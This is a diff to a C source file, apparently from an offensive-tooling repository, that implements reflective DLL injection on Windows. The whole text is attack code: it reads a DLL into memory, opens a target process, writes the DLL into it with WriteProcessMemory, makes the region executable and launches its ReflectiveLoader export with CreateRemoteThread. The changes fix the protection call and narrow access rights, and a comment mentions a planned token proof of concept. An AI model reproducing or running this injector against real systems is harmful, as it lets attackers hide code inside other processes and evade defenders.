@@ -1,5 +1,6 @@
-#include <stdio.h>
 #include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
 
 #define DEREF(name) *(UINT_PTR *)(name)
 #define DEREF_64(name) *(DWORD64 *)(name)
@@ -135,7 +136,7 @@ DWORD GetReflectiveLoaderOffset(VOID *lpReflectiveDllBuffer, LPCSTR cpReflective
     return 0;
 }
 
-int main()
+int main(int argc, char *argv[])
 {
     // // setup
 
@@ -149,29 +150,33 @@ int main()
 
     // //
 
-    HANDLE hFile = CreateFileA("Z:\\git\\offensive_c\\bin\\reflective_dll.x64.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+    // get dll into memory
+
+    // HANDLE hFile = CreateFileA("reflective_dll.x64.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hFile = CreateFileA("dll_reflective_loader.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     DWORD64 dwLength = GetFileSize(hFile, NULL);
-    LPVOID lpFileContent = HeapAlloc(GetProcessHeap(), 0, dwLength);
-    ReadFile(hFile, lpFileContent, dwLength, NULL, NULL);
+    LPVOID lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
+    ReadFile(hFile, lpBuffer, dwLength, NULL, NULL);
 
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
+    // TODO: process token stuff poc
 
-    // find offset of reflective loader function offset in memory
+    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pi.dwProcessId);
 
-    DWORD64 dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpFileContent, "ReflectiveLoader");
-    printf("offset %llx\n", dwReflectiveLoaderOffset);
+    // write dll into target process, call loader function remotely
+
+    DWORD64 dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer, "ReflectiveLoader");
+
+    printf("offset : %llx\n", dwReflectiveLoaderOffset);
+	DWORD dwOldProt; // this shit is mandatory !!!
 
     LPVOID lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-
-    WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpFileContent, dwLength, NULL);
-
-    VirtualProtectEx(hProcess, lpRemoteLibraryBuffer, dwLength, PAGE_EXECUTE_READ, NULL);
+    printf("address %p\n", lpRemoteLibraryBuffer);
+    WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL);
+    VirtualProtectEx(hProcess, lpRemoteLibraryBuffer, dwLength, PAGE_EXECUTE_READ, &dwOldProt);
 
     LPTHREAD_START_ROUTINE lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);
-    printf("reflective loader %llx\n", lpReflectiveLoader);
 
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, NULL, (DWORD_PTR)NULL, NULL);
-
 	WaitForSingleObject( hThread, -1 );
 
     printf("done.");
